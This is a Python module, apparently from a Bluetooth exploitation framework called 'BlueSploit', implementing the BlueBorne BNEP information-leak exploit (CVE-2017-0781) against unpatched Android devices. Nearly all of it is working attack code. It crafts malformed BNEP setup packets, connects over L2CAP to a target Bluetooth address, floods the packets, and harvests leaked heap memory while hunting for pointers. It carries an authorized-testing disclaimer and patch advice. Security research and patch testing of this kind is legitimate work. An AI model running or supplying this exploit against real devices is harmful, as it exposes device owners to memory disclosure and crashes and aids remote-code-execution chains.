"""
BlueSploit Module: BlueBorne Information Leak (CVE-2017-0781)
Android Bluetooth BNEP Information Disclosure Vulnerability

Exploits a heap overflow in Android's Bluetooth stack to leak memory.
Affects Android versions before security patch level September 2017.

Author: Mr-IoT
Original PoC: Armis Labs
CVE: CVE-2017-0781
"""

import struct
import time
from typing import Dict, Any, List, Optional
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity, Target
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# BNEP Protocol Constants
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01
BT_PSM_BNEP = 0x000F  # Bluetooth Network Encapsulation Protocol PSM

# Affected Android versions
AFFECTED_VERSIONS = [
    "Android 4.4.4 - 7.1.2 (before September 2017 patch)",
    "Android 8.0 (before September 2017 patch)"
]


class Module(ExploitModule):
    """
    BlueBorne Information Leak (CVE-2017-0781)
    
    This vulnerability exists in the BNEP (Bluetooth Network 
    Encapsulation Protocol) implementation in Android's Bluetooth stack.
    
    A malformed BNEP control message can cause an out-of-bounds read,
    leaking heap memory from the target device.
    
    DISCLAIMER: For authorized security testing only.
    """
    
    info = ModuleInfo(
        name="exploits/classic/blueborne_leak",
        description="BlueBorne Android BNEP Information Leak (CVE-2017-0781)",
        author=["v33ru", "Armis Labs"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://www.armis.com/blueborne/",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-0781",
            "https://source.android.com/security/bulletin/2017-09-01",
            "https://github.com/ArmisSecurity/blueborne"
        ],
        cve=["CVE-2017-0781"]
    )
    
    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "packets": ModuleOption(
                name="packets",
                required=False,
                description="Number of packets to send",
                default=30
            ),
            "delay": ModuleOption(
                name="delay",
                required=False,
                description="Delay between packets (ms)",
                default=50
            ),
            "payload": ModuleOption(
                name="payload",
                required=False,
                description="Overflow payload pattern",
                default="AAAABBBB"
            ),
            "mtu": ModuleOption(
                name="mtu",
                required=False,
                description="L2CAP MTU size",
                default=1500
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Connection timeout (seconds)",
                default=10
            )
        }
    
    def _p8(self, value: int) -> bytes:
        """Pack 8-bit value (replacement for pwntools p8)"""
        return struct.pack('B', value & 0xFF)
    
    def _p16(self, value: int) -> bytes:
        """Pack 16-bit value little-endian"""
        return struct.pack('<H', value & 0xFFFF)
    
    def _p32(self, value: int) -> bytes:
        """Pack 32-bit value little-endian"""
        return struct.pack('<I', value & 0xFFFFFFFF)
    
    def _set_bnep_header_extension_bit(self, bnep_header_type: int) -> int:
        """
        Set BNEP header extension bit.
        
        If the extension flag is equal to 0x1 then one or more 
        extension headers follows the BNEP header.
        If extension flag is equal to 0x0 then the BNEP payload 
        follows the BNEP header.
        """
        return bnep_header_type | 0x80  # Set bit 7
    
    def _bnep_control_packet(self, control_type: int, control_packet: bytes) -> bytes:
        """Create BNEP control packet"""
        return self._p8(control_type) + control_packet
    
    def _create_exploit_packet(self, overflow_data: bytes) -> bytes:
        """
        Create malformed BNEP packet that triggers info leak.
        
        The vulnerability is in how Android parses BNEP_SETUP_CONNECTION_REQUEST.
        A malformed packet with extension bit set causes out-of-bounds read.
        """
        pkt = b''
        # BNEP frame type with extension bit set
        pkt += self._p8(self._set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
        # Malformed control packet
        pkt += self._bnep_control_packet(
            BNEP_SETUP_CONNECTION_REQUEST_MSG,
            b'\x00' + overflow_data
        )
        return pkt
    
    def _print_packet_hex(self, packet: bytes, label: str = "Packet") -> None:
        """Print packet in hex dump format"""
        C = Colors
        hex_str = packet.hex()
        formatted = ' '.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))
        print(f"  {C.DARK_GREY}{label}: {formatted}{C.RESET}")
    
    def _print_results(self, target: str, packets_sent: int, success: bool, 
                       responses: List[bytes]) -> None:
        """Print exploit results in table format"""
        C = Colors
        
        print(f"\n  {C.CYAN}{'='*80}{C.RESET}")
        print(f"  {C.BOLD}{C.WHITE}BLUEBORNE INFORMATION LEAK RESULTS{C.RESET}")
        print(f"  {C.CYAN}{'='*80}{C.RESET}")
        print(f"  CVE          : {C.RED}CVE-2017-0781{C.RESET}")
        print(f"  Target       : {C.WHITE}{target}{C.RESET}")
        print(f"  Packets Sent : {packets_sent}")
        print(f"  Status       : {C.GREEN if success else C.RED}{'SUCCESS' if success else 'FAILED'}{C.RESET}")
        
        if responses:
            print(f"\n  {C.BOLD}LEAKED DATA{C.RESET}")
            print(f"  {C.CYAN}{'-'*80}{C.RESET}")
            
            for idx, resp in enumerate(responses, 1):
                hex_data = resp.hex()
                # Try to find interesting patterns
                ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in resp)
                
                print(f"  {C.YELLOW}[{idx}]{C.RESET} Length: {len(resp)} bytes")
                print(f"      Hex   : {hex_data[:60]}{'...' if len(hex_data) > 60 else ''}")
                print(f"      ASCII : {ascii_repr[:60]}{'...' if len(ascii_repr) > 60 else ''}")
                
                # Check for potential pointers (ARM 32-bit)
                if len(resp) >= 4:
                    for i in range(0, len(resp) - 3, 4):
                        ptr = struct.unpack('<I', resp[i:i+4])[0]
                        # Check if looks like heap/stack pointer
                        if 0x40000000 <= ptr <= 0xFFFFFFFF:
                            print(f"      {C.RED}Potential pointer at offset {i}: 0x{ptr:08X}{C.RESET}")
        
        # Vulnerability info
        print(f"\n  {C.CYAN}{'-'*80}{C.RESET}")
        print(f"  {C.BOLD}VULNERABILITY INFO{C.RESET}")
        print(f"  {C.CYAN}{'-'*80}{C.RESET}")
        print(f"  Type         : Heap-based Buffer Over-read")
        print(f"  Protocol     : BNEP (Bluetooth Network Encapsulation Protocol)")
        print(f"  PSM          : 0x{BT_PSM_BNEP:04X}")
        print(f"  Impact       : Information Disclosure, potential RCE chain")
        
        print(f"\n  {C.BOLD}AFFECTED VERSIONS{C.RESET}")
        for ver in AFFECTED_VERSIONS:
            print(f"    - {ver}")
        
        if success:
            print(f"\n  {C.RED}[!] TARGET APPEARS VULNERABLE TO CVE-2017-0781{C.RESET}")
            print(f"  {C.YELLOW}    Recommend: Update to Android security patch September 2017 or later{C.RESET}")
        else:
            print(f"\n  {C.GREEN}[+] Target may be patched or not vulnerable{C.RESET}")
        
        print(f"\n  {C.CYAN}{'='*80}{C.RESET}\n")
    
    def run(self) -> bool:
        """Execute BlueBorne information leak exploit"""
        
        if not BLUETOOTH_AVAILABLE:
            print_error("PyBluez library not installed!")
            print_info("Install with: pip install pybluez")
            print_info("Also need: sudo apt install libbluetooth-dev")
            return False
        
        target = self.target
        packets = int(self.get_option("packets"))
        delay = int(self.get_option("delay")) / 1000.0  # Convert to seconds
        payload = self.get_option("payload")
        mtu = int(self.get_option("mtu"))
        timeout = int(self.get_option("timeout"))
        
        # Validate BD_ADDR
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        # Convert payload to bytes
        if isinstance(payload, str):
            payload_bytes = payload.encode('utf-8')
        else:
            payload_bytes = payload
        
        # Create exploit packet
        exploit_pkt = self._create_exploit_packet(payload_bytes)
        
        # Print attack info
        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}BlueBorne CVE-2017-0781 - Information Leak{C.RESET}               {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        
        print_info(f"Target      : {target}")
        print_info(f"Packets     : {packets}")
        print_info(f"Payload     : {payload}")
        print_info(f"MTU         : {mtu}")
        print_info(f"PSM         : 0x{BT_PSM_BNEP:04X} (BNEP)")
        
        self._print_packet_hex(exploit_pkt, "Exploit Packet")
        
        print()
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Attempting connection in 3 seconds... (Ctrl+C to cancel)")
        
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print_warning("Cancelled by user")
            return False
        
        # Connect and send exploit
        sock = None
        responses = []
        packets_sent = 0
        success = False
        
        try:
            print_info("Creating L2CAP socket...")
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            
            # Set socket options
            try:
                bluetooth.set_l2cap_mtu(sock, mtu)
            except Exception as e:
                print_warning(f"Could not set MTU: {e}")
            
            # Set timeout
            sock.settimeout(timeout)
            
            print_info(f"Connecting to {target} on PSM 0x{BT_PSM_BNEP:04X}...")
            sock.connect((target, BT_PSM_BNEP))
            print_success("Connected!")
            
            print_info(f"Sending {packets} BNEP exploit packets...")
            
            for i in range(packets):
                try:
                    sock.send(exploit_pkt)
                    packets_sent += 1
                    
                    # Progress indicator
                    if (i + 1) % 10 == 0 or i == packets - 1:
                        print(f"\r  [{C.CYAN}{'█' * ((i+1) * 20 // packets)}{C.DARK_GREY}{'░' * (20 - (i+1) * 20 // packets)}{C.RESET}] {i+1}/{packets}", end='', flush=True)
                    
                    # Try to receive any leaked data
                    try:
                        sock.settimeout(0.1)
                        data = sock.recv(1024)
                        if data:
                            responses.append(data)
                            success = True
                    except bluetooth.btcommon.BluetoothError:
                        pass  # No data available
                    except Exception:
                        pass
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except bluetooth.btcommon.BluetoothError as e:
                    # Connection may be terminated by target
                    if "Connection reset" in str(e) or "104" in str(e):
                        print()
                        print_warning(f"Connection reset at packet {i+1} - possible crash or detection")
                        success = True  # Crash indicates vulnerability
                        break
                    raise
            
            print()  # Newline after progress bar
            print_success(f"Sent {packets_sent} packets")
            
            # Try final receive
            try:
                sock.settimeout(1)
                while True:
                    data = sock.recv(1024)
                    if data:
                        responses.append(data)
                        success = True
                    else:
                        break
            except:
                pass
            
        except bluetooth.btcommon.BluetoothError as e:
            err_str = str(e)
            if "Connection refused" in err_str or "111" in err_str:
                print_error("Connection refused - BNEP service not available")
                print_info("Target may not support BNEP or is not Android")
            elif "Host is down" in err_str or "112" in err_str:
                print_error("Host is down - device not reachable")
            elif "Connection reset" in err_str:
                print_warning("Connection reset - possible vulnerability triggered!")
                success = True
            else:
                print_error(f"Bluetooth error: {e}")
        except Exception as e:
            print_error(f"Error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        # Print results
        self._print_results(target, packets_sent, success, responses)
        
        # Store result
        self.add_result({
            "target": target,
            "cve": "CVE-2017-0781",
            "packets_sent": packets_sent,
            "vulnerable": success,
            "responses": [r.hex() for r in responses]
        })
        
        return success


# Alternative implementation using raw sockets (no PyBluez dependency)
class RawL2CAPSocket:
    """
    Raw L2CAP socket implementation for systems without PyBluez.
    Uses ctypes to interface with BlueZ directly.
    """
    
    def __init__(self):
        self._available = False
        try:
            import socket
            import ctypes
            self._socket = socket
            self._ctypes = ctypes
            self._available = True
        except ImportError:
            pass
    
    @property
    def available(self) -> bool:
        return self._available
    
    def connect(self, address: str, psm: int) -> bool:
        """Connect to L2CAP PSM"""
        # This would require implementing the full L2CAP socket
        # using raw HCI commands - complex and platform-specific
        raise NotImplementedError("Raw L2CAP requires PyBluez or custom implementation")
